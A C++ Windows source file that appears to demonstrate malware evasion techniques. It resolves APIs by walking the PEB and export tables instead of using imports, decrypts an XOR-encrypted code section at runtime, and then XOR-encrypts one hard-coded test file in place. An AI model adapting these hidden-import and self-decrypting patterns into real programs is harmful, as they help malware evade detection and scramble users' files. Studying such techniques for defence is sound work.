#include <Windows.h>
#include <winternl.h>

decltype(CreateFileW)* pCreateFile;
decltype(ReadFile)* pReadFile;
decltype(WriteFile)* pWriteFile;
decltype(GetFileSize)* pGetFileSize;
decltype(VirtualAlloc)* pVirtualAlloc;
decltype(VirtualProtect)* pVirtualProtect;
decltype(CloseHandle)* pCloseHandle;
decltype(GetModuleHandleA)* pGetModuleHandle;

bool EqualStrings(PCSTR s1, PCSTR s2) {
	while (*s1 && *s2 && *s1 == *s2) {
		s1++; s2++;
	}

	return *s1 == 0 && *s2 == 0;
}

size_t strlen2(PCSTR s) {
	size_t len = 0;
	while (*s++)
		len++;
	return len;
}

PVOID GetFunctionAddress(PVOID baseDll, PCSTR name) {
	auto p = (IMAGE_DOS_HEADER*)baseDll;
	auto ntHeader = (IMAGE_NT_HEADERS64*)((PBYTE)p + p->e_lfanew);
	auto& expDir = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	auto exports = (IMAGE_EXPORT_DIRECTORY*)((PBYTE)p + expDir.VirtualAddress);
	auto count = exports->NumberOfNames;
	auto namesOffset = *(DWORD*)((PBYTE)p + exports->AddressOfNames);
	auto names = (char*)((PBYTE)p + namesOffset);
	auto addr = (PDWORD)((PBYTE)p + exports->AddressOfFunctions);

	for (DWORD i = 0; i < count; i++) {
		if (EqualStrings(names, name)) {
			return addr[i] + (PBYTE)p;
		}
		if (addr[i] >= expDir.VirtualAddress && addr[i] < expDir.VirtualAddress + expDir.Size) {
			// forwarder
			names += strlen2(names) + 1;
		}
		names += strlen2(names) + 1;
	}

	return nullptr;
}

size_t wcslen2(PCWSTR s) {
	size_t len = 0;
	while (*s++)
		len++;
	return len;
}

PVOID FindAPI(PPEB peb, PCWSTR dllName, PCSTR funcName, HMODULE& baseAddress) {
	auto head = &peb->Ldr->InMemoryOrderModuleList;
	for (auto next = head->Flink; next != head; next = next->Flink) {
		auto entry = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		auto last = entry->FullDllName.Buffer + entry->FullDllName.Length / 2;
		auto i = wcslen2(dllName);
		while (((*--last) & ~0x20) == (dllName[--i] & ~0x20))
			;
		if (*last == L'\\') {
			// found it
			baseAddress = (HMODULE)entry->DllBase;
			return GetFunctionAddress(entry->DllBase, funcName);
		}

	}
	return nullptr;
}

#pragma code_seg(".text1")

bool EncDecFile(PCWSTR path) {
	auto hFile = pCreateFile(path, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;

	auto len = pGetFileSize(hFile, nullptr);
	auto buffer = (PBYTE)pVirtualAlloc(nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buffer)
		return false;

	DWORD read = 0;
	pReadFile(hFile, buffer, len, &read, nullptr);
	pCloseHandle(hFile);

	BYTE xorCode[] = { 0x45, 0x12, 0x87, 0xff, 0x47, 0x88, 0xc5 };
	for (DWORD i = 0; i < read; i++) {
		buffer[i] ^= xorCode[i % sizeof(xorCode)];
	}

	hFile = pCreateFile(path, GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
	pWriteFile(hFile, buffer, read, &read, nullptr);
	pCloseHandle(hFile);

	return true;
}

#pragma code_seg()

void DecodeCode() {
	auto p = (IMAGE_DOS_HEADER*)pGetModuleHandle(nullptr);
	auto ntHeader = (IMAGE_NT_HEADERS64*)((PBYTE)p + p->e_lfanew);
	auto sections = (IMAGE_SECTION_HEADER*)(ntHeader + 1);
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
		if (EqualStrings((const char*)sections->Name, ".text1")) {
			// found section

			auto data = sections->VirtualAddress + (PBYTE)p;
			auto size = sections->SizeOfRawData;

			DWORD oldProtect;
			pVirtualProtect(data, size, PAGE_READWRITE, &oldProtect);
			BYTE xorCode[] = { 0x45, 0x12, 0x87, 0xff, 0x47, 0x88, 0xc5 };
			for (DWORD i = 0; i < size; i++) {
				data[i] ^= xorCode[i % sizeof(xorCode)];
			}
			pVirtualProtect(data, size, oldProtect, &oldProtect);
			return;
		}
		sections++;
	}
}

void EncDecMemory(PBYTE buffer, ULONG len, PBYTE xorCode, ULONG xorLen) {
	for (DWORD i = 0; i < len; i++) {
		buffer[i] ^= xorCode[i % xorLen];
	}
}

int mainCRTStartup(PPEB peb) {
	if (false) {
		ExitProcess(0);
	}

	HMODULE hKernel32;
	auto pGetProcAddress = (decltype(GetProcAddress)*)FindAPI(peb, L"Kernel32.Dll", "GetProcAddress", hKernel32);
	auto pLoadLibraryA = (decltype(LoadLibraryA)*)pGetProcAddress(hKernel32, "LoadLibraryA");
	pGetModuleHandle = (decltype(GetModuleHandleA)*)pGetProcAddress(hKernel32, "GetModuleHandleA");
	pCreateFile = (decltype(CreateFileW)*)pGetProcAddress(hKernel32, "CreateFileW");
	pReadFile = (decltype(ReadFile)*)pGetProcAddress(hKernel32, "ReadFile");
	pWriteFile = (decltype(WriteFile)*)pGetProcAddress(hKernel32, "WriteFile");
	pGetFileSize = (decltype(GetFileSize)*)pGetProcAddress(hKernel32, "GetFileSize");
	pVirtualAlloc = (decltype(VirtualAlloc)*)pGetProcAddress(hKernel32, "VirtualAlloc");
	pVirtualProtect = (decltype(VirtualProtect)*)pGetProcAddress(hKernel32, "VirtualProtect");
	pCloseHandle = (decltype(CloseHandle)*)pGetProcAddress(hKernel32, "CloseHandle");

	DecodeCode();
	EncDecFile(L"d:\\temp\\mandel.png");

	return 0;
}


